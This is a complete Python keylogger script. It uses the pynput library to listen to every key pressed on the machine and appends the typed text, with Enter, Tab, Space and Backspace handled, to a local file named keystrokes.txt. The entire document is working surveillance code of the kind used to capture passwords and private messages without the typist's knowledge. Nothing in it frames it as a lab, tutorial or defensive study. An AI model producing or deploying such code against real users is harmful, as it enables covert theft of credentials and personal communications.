from pynput import keyboard
import os

text = ""

# File to save the keystrokes in the current directory where the script is located.
script_dir = os.path.dirname(os.path.abspath(__file__))
file_path = os.path.join(script_dir, "keystrokes.txt")

def save_to_file():
    global text
    try:
        with open(file_path, "a") as file:
            file.write(text)
            text = ""  # Clear the text after saving.
    except Exception as e:
        print(f"Error saving to file: {e}")

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.esc]:
        pass
    else:
        text += str(key).strip("'")

    save_to_file()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
